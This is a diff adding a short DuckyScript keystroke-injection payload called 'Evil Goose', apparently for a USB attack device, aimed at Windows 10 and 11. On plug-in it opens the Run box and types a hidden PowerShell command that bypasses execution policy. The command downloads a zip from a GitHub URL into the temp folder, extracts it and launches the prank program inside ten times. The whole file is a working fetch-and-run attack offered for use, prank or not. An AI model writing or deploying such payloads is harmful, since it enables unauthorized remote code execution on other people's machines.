@@ -1,0 +1,12 @@
+REM     Title: Evil Goose
+
+REM     Author: kcoderhtml
+
+REM     Description: A payload gets annyoing geese
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp"; iwr -Uri 'https://raw.githubusercontent.com/kcoderhtml/x/main/goose.zip' -OutFile "$D\goose.zip"; Expand-Archive "$D\goose.zip" -DestinationPath $D -Force; 1..10 | ForEach-Object { Start-Process "$D\goose\GooseDesktop.exe" }
+ENTER
